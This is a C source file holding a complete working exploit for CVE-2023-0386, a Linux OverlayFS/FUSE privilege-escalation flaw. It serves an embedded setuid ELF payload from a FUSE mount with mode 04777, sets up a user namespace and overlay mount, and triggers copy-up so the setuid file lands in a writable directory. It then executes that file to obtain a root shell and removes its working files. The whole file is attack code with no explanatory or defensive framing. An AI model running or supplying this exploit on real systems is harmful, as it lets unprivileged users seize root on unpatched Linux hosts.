#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>

#define FUSE_USE_VERSION 34
#include "fuse.h"

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define TMP_DIR "/tmp"

const char *suid_fname = "suid_shell";
char *mnt_path;
char *workdir;
char *g_buf;

unsigned char suid_binary[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x56, 0x56, 0x56,
    0x56, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x58, 0xeb, 0x48,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x57, 0x54, 0x59, 0x48, 0x33, 0x39, 0x59, 0x6a, 0x6f, 0x54, 0x59, 0x66,
    0x69, 0x39, 0x70, 0x59, 0x57, 0x5a, 0x6a, 0x4a, 0x54, 0x59, 0x66, 0x69,
    0x39, 0x70, 0x30, 0x30, 0x74, 0x38, 0x30, 0x30, 0x54, 0x38, 0x55, 0x30,
    0x54, 0x38, 0x56, 0x6a, 0x42, 0x54, 0x59, 0x66, 0x69, 0x39, 0x38, 0x59,
    0x30, 0x74, 0x38, 0x30, 0x30, 0x54, 0x38, 0x4b, 0x48, 0x63, 0x31, 0x6a,
    0x73, 0x54, 0x59, 0x66, 0x69, 0x31, 0x36, 0x78, 0x4c, 0x4a, 0x74, 0x30,
    0x49, 0x6a, 0x52, 0x54, 0x59, 0x66, 0x69, 0x31, 0x45, 0x6d, 0x56, 0x59,
    0x49, 0x4a, 0x34, 0x4e, 0x56, 0x54, 0x58, 0x41, 0x6b, 0x76, 0x32, 0x31,
    0x42, 0x32, 0x74, 0x31, 0x31, 0x41, 0x30, 0x76, 0x31, 0x49, 0x6f, 0x56,
    0x4c, 0x39, 0x30, 0x75, 0x7a, 0x64, 0x54, 0x58, 0x73, 0x78, 0x30, 0x42,
    0x41, 0x31, 0x73, 0x6a, 0x7a, 0x36, 0x64, 0x75, 0x54, 0x6f, 0x41, 0x37,
    0x7a, 0x4b, 0x35, 0x70, 0x79, 0x31, 0x72, 0x41, 0x73, 0x6a, 0x59, 0x79,
    0x64, 0x59, 0x55, 0x6a, 0x36, 0x35, 0x46, 0x65, 0x59, 0x6e, 0x6e, 0x56,
    0x4b, 0x50, 0x30, 0x6e, 0x45, 0x59, 0x50, 0x6e, 0x36, 0x50, 0x39, 0x63,
    0x70, 0x37, 0x6d, 0x4a, 0x4b, 0x62, 0x79, 0x68, 0x4b, 0x63, 0x52, 0x4f,
    0x7a, 0x64, 0x75, 0x4f, 0x4d, 0x33, 0x4c, 0x7a, 0x36, 0x38, 0x66};

int evil_read(const char *path, char *buf, size_t size, off_t offset,
              struct fuse_file_info *fi) {
    char signal;

    size_t len = sizeof(suid_binary);
    if (offset >= len)
        return size;
    if (offset + size > len)
        size = len - offset;
    memcpy(buf, suid_binary + offset, size);

    return size;
}

int evil_getattr(const char *path, struct stat *stbuf,
                 struct fuse_file_info *fi) {
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    } else if (strcmp(path + 1, suid_fname) == 0) {
        stbuf->st_mode = S_IFREG | 04777;
        stbuf->st_nlink = 1;
        stbuf->st_size = sizeof(suid_binary);
    } else {
        res = -ENOENT;
    }

    return res;
}

int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                 off_t offset, struct fuse_file_info *fi,
                 enum fuse_readdir_flags flags) {
    if (strcmp(path, "/") != 0)
        return -ENOENT;

    filler(buf, ".", NULL, 0, 0);
    filler(buf, "..", NULL, 0, 0);
    filler(buf, suid_fname, NULL, 0, 0);

    return 0;
}

int evil_getxattr(const char *path, const char *name, char *value,
                  size_t size) {
    int res = lgetxattr(path, name, value, size);
    if (res == -1)
        return -errno;
    return res;
}

static off_t evil_lseek(const char *path, off_t off, int whence,
                        struct fuse_file_info *fi) {
    return 0;
}

int evil_listxattr(const char *path, char *list, size_t size) { return 0; }

int evil_ioctl(const char *path, int cmd, void *arg, struct fuse_file_info *fi,
               unsigned int flags, void *data) {

    // bypass ovl_copy_fileattr
    return -EINVAL; // for 5.15.3
}

static const struct fuse_operations evil_ops = {
    .getattr = evil_getattr,
    .readdir = evil_readdir,
    .read = evil_read,
    .getxattr = evil_getxattr,
    .lseek = evil_lseek,
    .listxattr = evil_listxattr,
    .ioctl = evil_ioctl,
};

void do_init(int argc, char **argv) {

    char *cmd;
    if (argc > 1) {
        asprintf(&workdir, "%s/%d", argv[1], getpid());
    } else {
        asprintf(&workdir, "/tmp/%d", getpid());
    }
    logd("workdir: %s", workdir);

    asprintf(&mnt_path, "%s/lower", workdir);

    asprintf(&cmd, "mkdir -p %s", mnt_path);
    system(cmd);
    asprintf(&cmd, "mkdir -p %s/upper", workdir);
    system(cmd);
    asprintf(&cmd, "mkdir -p %s/work", workdir);
    system(cmd);
    asprintf(&cmd, "mkdir -p %s/merge", workdir);
    system(cmd);

    asprintf(&cmd,
             "mount | grep \"on `df %s | tail -n1 | awk '{print $6}'` \" | "
             "grep nosuid",
             workdir);
    if (!system(cmd)) {
        logw("make sure workdir mountpoint doesn't have nosuid flag");
        logw("pass vaild workdir from argv[1]");
    }
}

void init_namespace() {
    int fd;
    char buff[0x100];

    int uid, gid;
    uid = getuid();
    gid = getgid();

    // strace from `unshare -Urm xxx`
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

int main(int argc, char **argv) {
    logi("CVE-2023-0386");

    do_init(argc, argv);
    if (!fork()) {
        logd("mount fuse");
        char *fargs_evil[] = {"fuse", "-d", mnt_path, NULL};
        // char *fargs_evil[] = {"fuse", mnt_path, NULL};
        fuse_main(sizeof(fargs_evil) / sizeof(char *) - 1, fargs_evil,
                  &evil_ops, NULL);
        return 0;
    }

    logd("check fuse ...");
    // wait 5s
    bool found = false;
    for (int i = 0; i < 10; i++) {
        asprintf(&g_buf, "ls -l %s/lower/%s 2>/dev/null 1>/dev/null", workdir,
                 suid_fname);
        if (!system(g_buf)) {
            found = true;
            break;
        }
        usleep(500 * 1000);
    }
    if (!found) {
        die("fuse may failed");
    }

    if (!fork()) {
        logd("init namespace");
        init_namespace();

        chdir(workdir);

        logd("mount overlay");
        system("mount -t overlay -o lowerdir=lower,upperdir=upper,workdir=work "
               "overlay merge");

        logd("check overlay ...");
        found = false;
        for (int i = 0; i < 10; i++) {
            asprintf(&g_buf, "ls -l %s/merge/%s 2>/dev/null 1>/dev/null",
                     workdir, suid_fname);
            if (!system(g_buf)) {
                found = true;
                break;
            }
            usleep(500 * 1000);
        }
        if (!found) {
            die("overlay mount may failed");
        }

        logd("trigger vuln");
        asprintf(&g_buf, "touch %s/merge/%s", workdir, suid_fname);
        system(g_buf);
        return 0;
    }

    logd("check if vuln exist ...");
    // wait 7s
    found = false;
    for (int i = 0; i < 14; i++) {
        asprintf(&g_buf, "ls -l %s/upper/%s 2>/dev/null 1>/dev/null", workdir,
                 suid_fname);
        if (!system(g_buf)) {
            found = true;
            break;
        }
        usleep(500 * 1000);
    }
    if (!found) {
        die("attack may failed");
    }
    logi("VULNERABLE");

    if (!fork()) {
        // wait parent execute
        sleep(1);

        int fd = open("/dev/null", O_RDWR);
        dup2(fd, 1);
        dup2(fd, 2);

        asprintf(&g_buf, "fusermount -u %s/lower || fusermount3 -u %s/lower",
                 workdir, workdir);
        system(g_buf);

        // wait 5s
        found = true;
        for (int i = 0; i < 10; i++) {
            asprintf(&g_buf, "ls -l %s/lower/%s", workdir, suid_fname);
            if (system(g_buf)) {
                found = false;
                break;
            }
            usleep(500 * 1000);
        }
        if (!found) {
            asprintf(&g_buf, "rm -rf %s", workdir);
            system(g_buf);
        }

        return 0;
    }

    logi("get shell");
    asprintf(&g_buf, "%s/upper/%s", workdir, suid_fname);
    system(g_buf);

    return 0;
}
